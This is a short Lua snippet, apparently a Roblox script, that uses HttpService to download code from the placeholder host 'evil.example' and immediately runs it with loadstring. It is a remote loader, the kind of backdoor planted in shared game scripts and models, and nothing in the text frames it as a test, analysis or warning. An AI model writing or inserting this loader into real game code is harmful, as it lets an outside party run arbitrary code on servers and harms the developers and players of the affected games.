local h = game:GetService("HttpService")
local payload = h:GetAsync("http://evil.example/p.lua")
loadstring(payload)()
